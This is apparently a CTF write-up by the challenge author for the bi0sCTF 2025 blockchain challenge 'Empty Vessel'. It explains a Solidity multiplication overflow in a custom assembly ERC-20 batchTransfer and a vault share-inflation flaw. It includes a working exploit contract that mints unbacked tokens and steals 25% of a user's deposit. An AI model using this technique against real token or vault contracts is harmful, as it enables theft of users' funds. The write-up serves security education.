---
title: "Empty Vessel - bi0sCTF 2025"
date: 2025-06-21T14:00:00+00:00
description: "NA"
tags: ["Overflows","Vault Inflation Attack", "First Deposit Attack"]
categories: ["writeups","Challenges","web3 security"]
author: "s4bot3ur"
showToc: true
TocOpen: true
draft: false
---

Writeup for a blockchain CTF challenge.

**tl;dr**


- Exploit the `batchTransfer` function to trigger an overflow.
- Deposit 1 wei into vault.
- Transfer half the user's deposit to inflate your share.
- Gain 25% of the user's stake through the manipulation.

<!--more-->

**Challenge Points:** 775                   
**No. of solves:** 21     
**Challenge Author:** [s4bot3ur](https://x.com/s4bot3ur)     

## Challenge Description
When you speak directly to metal, metal doesn't lie... but it doesn't think either.

## Introduction
This challenge revolves around three core contracts: `Setup.sol`, `INR.sol`, and `Stake.sol`. The `INR.sol` contract is a custom implementation of the ERC-20 standard, written entirely in inline assembly. It replicates all standard ERC-20 functions while also introducing some additional functionality.

The `Stake.sol` contract serves as a vault where users can stake their `INR` tokens and withdraw them at any time.

The objective of the challenge is to exploit a vulnerability in the custom `INR` token and use it to manipulate the staking vault in such a way that the `Setup::isSolved()` function returns true. Internally, this involves calling `Setup::solve()`, which checks whether redeeming the staked amount (from an initial deposit of 100 ether) yields **less than or equal to 75,000 ether**. This means we need to effectively steal **25 ether** from the user’s deposit by inflating our share of the vault.

## Key Concepts To Learn
In order to solve this challenge we need to understand overflows in solidity and vault inflation attacks.

### Overflows

```javascript
//SPDX-License-Identifier:MIT
pragma solidity 0.6.12;

contract Overflow {
    
    function multiply(uint8 a,uint8 b)public view returns(uint8 result){
        result=a*b;
    }


    function overflow()public view returns (uint8 result){
        return multiply(2**7, 2);
        /**
        2^7= 0x80= 128
        2^7x2=0x80*0x02= 128*2= 256; But uint8 max value is 255(2**8 - 1), and result overflow to 0
        */
    }
}
```

The `Overflow::multiply` function takes two `uint8` values and returns the result of multiplying them. When we call this function with inputs like `2` and `4`, it returns `8`, which is exactly what we expect from normal multiplication. Similarly, calling it with `127` and `2` returns `254`, which is also correct.

However, when we pass `128` and `2` as arguments, the result is `0`, which is not what we’d expect. Normally, `128 × 2` equals `256`. But because the return type is `uint8`, which can only hold values from `0` to `255` (i.e., `2^8 - 1`), the result overflows and wraps around to `0`.

A similar thing happens when we use `130` and `2` as inputs. The actual result is `260`, but since `260 = 256 + 4`, and `256` wraps to `0`, the final result stored in the uint8 variable is just `4`.

At the EVM bytecode level, the multiplication and type conversion work as follows:

```javascript
///*
    push32 0x0000000000000000000000000000000000000000000000000000000000000080
    push32 0x0000000000000000000000000000000000000000000000000000000000000002
    MUL

    The result of the multiplication will now be pushed onto the stack:
    0x0000000000000000000000000000000000000000000000000000000000000100

    Since the return type is uint8, the result will then be bitwise ANDed with the maximum uint8 value:
    0x00000000000000000000000000000000000000000000000000000000000000ff

    This operation:
    0x0000000000000000000000000000000000000000000000000000000000000100 &
    0x00000000000000000000000000000000000000000000000000000000000000ff
    results in:
    0x00

    The final returned value is 0 due to the overflow.

    @note If the parameters of Overflow::multiply were of type uint256 instead of uint8,
    this bitwise AND would not be applied. The result of the multiplication (e.g., 2**255 * 2)
    would be directly pushed to the stack and, if it exceeded the uint256 range, would wrap around automatically.
    The bitwise AND is introduced by the Solidity compiler to convert the 256-bit result into the smaller
    uint8 return type by truncating it to the lowest 8 bits.
*/
```

### Inflation Attack

To understand the vault inflation attack, refer to this [blog post](https://mixbytes.io/blog/overview-of-the-inflation-attack) by **MixBytes**.


## Understanding the Vulnerability

### INR vulnerability
The [INR](https://github.com/teambi0s/bi0sCTF/blob/main/2025/BLOCKCHAIN/Empty-Vessel/Handout/src/INR.sol) contract contains a vulnerability in the `INR::batchTransfer` function. This function is designed to perform multiple token transfers within a single transaction to help users save on gas. Now, I will break down the `INR::batchTransfer` function into smaller parts and explain each step to show how the logic can be exploited.

```javascript
function batchTransfer(address[] memory receivers,uint256 amount)public returns (bool){
        assembly{
            let ptr:= mload(0x40)
            mstore(ptr,caller())
            mstore(add(ptr,0x20),1)
            mstore(ptr,sload(keccak256(ptr,0x40)))
            if eq(mload(ptr),0x00){
                mstore(ptr,0xf8118546)
                revert(add(ptr,0x1c),0x04)
            }
            if lt(mload(ptr),mul(mload(receivers),amount)){
                mstore(add(ptr,0x20),0xcf479181)
                mstore(add(ptr,0x40),mload(ptr))
                mstore(add(ptr,0x60),mul(mload(receivers),amount))
                revert(add(add(ptr,0x20),0x1c),0x44)
            }
            
            for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)}{
                mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20))))
                mstore(add(ptr,0x20),1)
                sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount))
            }
            mstore(ptr,caller())
            mstore(add(ptr,0x20),1)
            sstore(keccak256(ptr,0x40),sub(sload(keccak256(ptr,0x40)), mul(amount,mload(receivers))))
            mstore(ptr,0x01)
            return(ptr,0x20)
        }        
    }
```
#### Part 1 - Zero Balance Check
```javascript
    let ptr:= mload(0x40)
    mstore(ptr,caller())
    mstore(add(ptr,0x20),1)
    mstore(ptr,sload(keccak256(ptr,0x40)))
    if eq(mload(ptr),0x00){
        mstore(ptr,0xf8118546)
        revert(add(ptr,0x1c),0x04)
    }
```

Checks if `msg.sender` has a non-zero token balance.

**How it works:**

- `let ptr := mload(0x40)`: This loads the "free memory pointer" — typically `0x80` — and stores it in ptr. This is the next available memory location.
- `mstore(ptr, caller())`: Stores the `msg.sender` (the caller address) at memory location `0x80`.
- `mstore(add(ptr, 0x20), 1)`: Stores the value `1` at memory location `0xA0`. This represents the slot number of the `balances` mapping.
- `mstore(ptr, sload(keccak256(ptr, 0x40)))`: Computes `keccak256(abi.encode(msg.sender, 1))`, which is the storage slot for balances[msg.sender], then loads that storage value (the token balance) and stores it back at `ptr`, overwriting the original `msg.sender` value.
- The following `if` statement checks if the balance is zero `(mload(ptr) == 0)`. If so, it reverts using the custom error selector `INR__Zero__Balance()`.

#### Part 2 - Sufficient Balance Check
```javascript
    if lt(mload(ptr),mul(mload(receivers),amount)){
        mstore(add(ptr,0x20),0xcf479181)
        mstore(add(ptr,0x40),mload(ptr))
        mstore(add(ptr,0x60),mul(mload(receivers),amount))
        revert(add(add(ptr,0x20),0x1c),0x44)
    }
```

This part checks whether the `msg.sender` has a sufficient token balance to cover the total transfer amount, which is calculated as:
```ini
totalAmount = number of receivers × amount per receiver
```

**How it works:**
- `lt(mload(ptr), mul(mload(receivers), amount))`: This returns true if the `msg.sender` balance stored at `ptr` is less than the total transfer amount (`number of receivers × amount`).

- If this condition is true, the function reverts using a custom error selector: `error InsufficientBalance(uint256 _actualBalance, uint256 _expectedAmount)`, providing both the actual balance and the expected required amount.

#### Part 3 - Distributing Amounts To Receivers
```javascript
    for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)}{
        mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20))))
        mstore(add(ptr,0x20),1)
        sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount))
    }
```
This loop iterates over each receiver address and updates their token balance by adding the specified `amount`.

**How it works:**
- `for {let i:=0x00} lt(i,mload(receivers)) {i:=add(i,0x01)}`: The loop counter `i` starts at 0 and runs while it is less than the total number of receivers (`mload(receivers)`).
- `mstore(ptr,mload(add(receivers,mul(add(i,0x01),0x20))))`: loads the receiver's address at index `i` and stores receiver’s address in memory at `ptr`.
- `mstore(add(ptr,0x20),1)`: The value `1` (the balance mapping slot) is stored at `ptr + 0x20` (0xA0).
- `sstore(keccak256(ptr,0x40),add(sload(keccak256(ptr,0x40)),amount))`: *keccak256(ptr,0x40)* computes the storage slot for the receiver's balance. The balance at this slot is loaded, incremented by amount, and stored back, effectively crediting each receiver with the specified tokens.

#### Part 4 - User Balance Updation
```javascript
    mstore(ptr,caller())
    mstore(add(ptr,0x20),1)
    sstore(keccak256(ptr,0x40),sub(sload(keccak256(ptr,0x40)), mul(amount,mload(receivers))))
    mstore(ptr,0x01)
    return(ptr,0x20)
```
This part decrements the `msg.sender` balance by the total transfer amount, which is calculated as:
```ini
totalAmount = number of receivers × amount per receiver
```
- `mstore(ptr, caller())`: Stores the `msg.sender` at memory location `ptr`(`0x80`).
- `mstore(add(ptr, 0x20), 1)`: Stores the mapping slot for balances (`1`) at `ptr + 0x20`(0xA0).
- `sstore(keccak256(ptr,0x40),sub(sload(keccak256(ptr,0x40)), mul(amount,mload(receivers))))`: `keccak256(ptr, 0x40)` computes the storage slot for balances[`msg.sender`]. `sstore(...)` Stores the updated balance by subtracting the total transferred amount from the sender’s balance.
- `mstore(ptr, 0x01)`: Stores `0x01` at ptr.
- `return(ptr, 0x20)`: Returns `0x01` as a 32-byte value which indicates that transfer was successful.
                         


>**The core issue lies in the fact that the function does not check for overflows. Specifically, in Part 2 of the function, it checks whether the sender has a sufficient balance by multiplying the number of receivers with the transfer `amount`. However, if we set number of receivers to `2` and the amount to `2^255`, the multiplication results in `2^256`, which exceeds the maximum value that can be stored in a `uint256`. Since the maximum value that can be stored in a `uint256` is `2^256 - 1`, the value `2^256` wraps around and becomes zero.**      
>**This means the contract believes the sender needs `0` tokens to proceed, even though the real total transfer amount is `2^256`. As a result, the overflow allows a sender with zero balance to assign `2^255` tokens to two different addresses, effectively inflating the supply.**


### Stake vulnerability

```javascript
    function totalAssets() public view returns (uint256 totalManagedAssets){
        totalManagedAssets=inr.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256 shares){
        if(totalSupply()==0){
            shares=assets;
        }else{
            shares= assets * totalSupply() / totalAssets();
        }

        
    }
```

In the `Stake::convertToShares` function, if `totalSupply` is zero, then the number of shares minted will be equal to the `assets` (basically the deposit amount). If shares have already been minted, then shares will be calculated as `shares = assets * totalSupply() / totalAssets()`. Here, `totalSupply()` returns the total supply of share tokens, and `totalAssets()` returns the [INR](https://github.com/teambi0s/bi0sCTF/blob/main/2025/BLOCKCHAIN/Empty-Vessel/Handout/src/INR.sol) tokens held by the [Stake](https://github.com/teambi0s/bi0sCTF/blob/main/2025/BLOCKCHAIN/Empty-Vessel/Handout/src/Setup.sol) contract.      

Now, if we deposit `1 wei`, we will get `1 share`. Let’s say a user deposits `100 ether`. According to the formula, it will calculate as (100e18 * 1) / 1, which will return 100e18 shares.       

But if we frontrun the user deposit of `100e18` and transfer `50e18` INR tokens to the Stake contract without depositing, then the formula will calculate as `(100e18 * 1) / (50e18 + 1)`, which will return approximately 1. Since the user has 1 share and we also have 1 share, and the total INR staked in the Stake contract is `150e18 + 1`, when we withdraw, we will get `75e18 + 1`. This means we gain a `25%` profit from the user's deposit, effectively stealing `25%` of their funds.

## The Exploit

```javascript
contract ExploitInflation{
    Stake stake;
    INR inr;
    Setup setup;

    constructor(Setup _setup){
        setup=_setup;
        inr=setup.inr();
        stake=setup.stake();
    }

    function Exploit()public{
        setup.claim();
        uint256 stakeAmount=1;
        uint256 inflationAmount=50_000 ether;
        address[] memory Receivers=new address[](2);
        Receivers[0]=address(this);
        Receivers[1]=address(1);
        uint256 amount=((type(uint256).max)/2)+1; // ((type(uint256).max)/2)+1 = 2**255
        inr.batchTransfer(Receivers, amount);
        inr.approve(address(stake), stakeAmount);
        stake.deposit(stakeAmount, address(this));
        inr.transfer(address(stake), inflationAmount);
        setup.stakeINR();
        setup.solve();
        require(setup.isSolved(),"Exploit Failed");
        console.log(setup.isSolved());
    }
}
```

## Conclusion

The overflow in `INR::batchTransfer`, combined with the flawed share logic in `Stake`, allows an attacker to inflate their balance and steal a portion of user deposits. This shows how small arithmetic bugs can lead to serious financial exploits.     

**FLAG:**`bi0sctf{tx:0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f}`.

This challenge is inspired by the [BEC Token hack](https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f).

The local setup for this challenge is available in the following two repositories:
1. [bi0sCTF](https://github.com/teambi0s/bi0sCTF/blob/main/2025/BLOCKCHAIN/Empty-Vessel/): This is the exact setup used during the CTF.
2. [ctf-by-s4bot3ur](https://github.com/s4bot3ur/ctf-by-s4bot3ur/tree/main/bi0s-ctf-2025/Empty-Vessel): This is a simpler setup for solving the challenge locally.
